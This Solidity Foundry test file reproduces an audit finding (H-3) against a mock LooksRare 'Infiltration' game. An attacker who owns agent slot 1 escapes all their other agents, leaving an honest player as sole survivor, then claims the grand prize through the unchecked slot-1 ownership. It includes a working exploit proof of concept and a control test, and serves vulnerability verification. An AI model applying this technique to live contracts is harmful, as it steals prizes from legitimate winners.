// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./27588-h-3-attacker-can-steal-reward-of-actual-winner-by-force-endi.sol";

/*//////////////////////////////////////////////////////////////
    LooksRare "Infiltration" — attacker steals the grand prize by force ending
    the game (H-3, #27588)

    The game ends once `activeAgents == 1`, and `claimGrandPrize` pays the
    prize to whoever owns the FIXED slot `agents[1]` — never checking that
    slot 1 is actually still active. An attacker who owns agent #1 can escape
    every OTHER agent they own, leaving a genuinely honest player's agent as
    the sole active participant (game correctly ends), then claim the prize
    for themselves via the stale slot-1 ownership check.

    - test_exploit: drives the cheatcode-free Exploit end to end, then
      re-asserts the harm (attacker paid, honest winner blocked) independently.
    - test_forceWin_standalone: standalone rebuild with EOA actors, mirroring
      the finding's own `test_forceWin` PoC shape.
    - test_control_soleSurvivorAtSlot1_getsPaid: control — if the sole
      survivor IS actually parked at slot 1, claimGrandPrize correctly pays
      them, isolating the bug to the slot-1/active mismatch.
//////////////////////////////////////////////////////////////*/
contract ForceWinStealPrizeTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        e.run();

        MockLooksToken prize = e.prize();
        assertEq(prize.balanceOf(address(e)), e.game().GRAND_PRIZE(), "attacker should hold the stolen grand prize");
        assertEq(prize.balanceOf(address(e.honestPlayer())), 0, "honest player should receive nothing");
    }

    function test_forceWin_standalone() public {
        MockLooksToken prize = new MockLooksToken();
        Infiltration game = new Infiltration(prize);

        address attacker = makeAddr("attacker");
        address user1 = makeAddr("user1");

        // Attacker mints agents 1..30 (LOW ids) then 32..61 (HIGH ids); user1 mints agent 31.
        vm.startPrank(attacker);
        for (uint256 i; i < 30; i++) {
            game.mint(attacker);
        }
        vm.stopPrank();

        vm.prank(user1);
        game.mint(user1); // agent 31

        vm.startPrank(attacker);
        for (uint256 i; i < 30; i++) {
            game.mint(attacker);
        }
        vm.stopPrank();

        // Attacker escapes everything except agent 31 (user1's).
        uint256[] memory escapeIds = new uint256[](60);
        uint256 k;
        for (uint256 i = 1; i <= 30; i++) {
            escapeIds[k++] = i;
        }
        for (uint256 i = 32; i <= 61; i++) {
            escapeIds[k++] = i;
        }
        vm.prank(attacker);
        game.escape(escapeIds);

        uint256 activeAgents = game.gameInfo();
        assertEq(activeAgents, 1, "only user1's agent should remain active");

        // startNewRound reverts — game is over.
        vm.prank(attacker);
        vm.expectRevert(Infiltration.GameOver.selector);
        game.startNewRound();

        // User1 (the true last player standing) cannot claim.
        vm.prank(user1);
        vm.expectRevert(Infiltration.NotAgentOwner.selector);
        game.claimGrandPrize();

        // The attacker claims instead, via the stale agents[1] slot.
        vm.prank(attacker);
        game.claimGrandPrize();
        assertEq(prize.balanceOf(attacker), game.GRAND_PRIZE(), "attacker stole the grand prize");
    }

    /// @notice Control: if the sole remaining survivor legitimately owns slot
    ///         1 (i.e., slot 1 IS the last player standing), claimGrandPrize
    ///         correctly pays THEM — proving the bug is specifically the
    ///         slot-1/active mismatch, not a broken payout mechanism.
    function test_control_soleSurvivorAtSlot1_getsPaid() public {
        MockLooksToken prize = new MockLooksToken();
        Infiltration game = new Infiltration(prize);

        address winner = makeAddr("winner");
        address other = makeAddr("other");

        vm.prank(winner);
        game.mint(winner); // agent 1 — the eventual sole survivor

        vm.startPrank(other);
        for (uint256 i; i < 4; i++) {
            game.mint(other);
        }
        vm.stopPrank();

        // `other` escapes its own agents (2..5), leaving agent 1 (winner) active.
        uint256[] memory escapeIds = new uint256[](4);
        escapeIds[0] = 2;
        escapeIds[1] = 3;
        escapeIds[2] = 4;
        escapeIds[3] = 5;
        vm.prank(other);
        game.escape(escapeIds);

        assertEq(game.gameInfo(), 1, "only the winner's agent should remain active");

        vm.prank(winner);
        game.claimGrandPrize();
        assertEq(prize.balanceOf(winner), game.GRAND_PRIZE(), "control: legitimate winner is paid correctly");
    }
}
